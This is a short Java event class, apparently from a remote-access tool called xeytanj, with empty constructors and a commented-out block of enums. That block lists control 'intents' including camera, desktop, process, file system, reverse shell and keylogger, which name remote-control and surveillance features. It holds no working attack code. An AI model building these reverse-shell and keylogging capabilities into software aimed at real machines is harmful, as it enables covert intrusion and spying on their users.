package com.melardev.xeytanj.concurrent.messaging.events;

public class NetEvent
        extends AppEvent {
    //extends AbstractEvent {

    public NetEvent(){}
    public NetEvent(String description) {

    }

    public NetEvent(Object obj){}
/*
    public NetEvent(String description) {

    }

    public enum NetEventType {
        DESKTOP_CONFIG, DESKTOP,
        CAMERA_CONFIG, CAMERA
    }

    public enum Target {
        Server, Client
    }

    public enum Action {
        START, Pause, STOP,
        UPDATE,
    }

    public enum Intent {
        Connection, Information, Camera, Desktop,
        Process, REVERSE_SHELL,
        CHAT,
        FileSystem,
        Keylogger
    }

    private NetEventType netEventType;
    protected Target target;
    protected Intent subject;
    protected Action action;

    public Target getTarget() {
        return target;
    }

    public Intent getSubject() {
        return subject;
    }

    public Action getAction() {
        return action;
    }

    public void setAction(Action action) {
        this.action = action;
    }


    public NetEvent() {
    }

    public NetEvent(NetEventType eventType) {
        this.netEventType = eventType;
    }

    public NetEvent(NetEventType netEventType, Object object) {
        super(object);
        this.netEventType = netEventType;
    }

    public void setTarget(Target target) {
        this.target = target;
    }

    public void setIntent(Intent subject) {
        this.subject = subject;
    }
*/
}
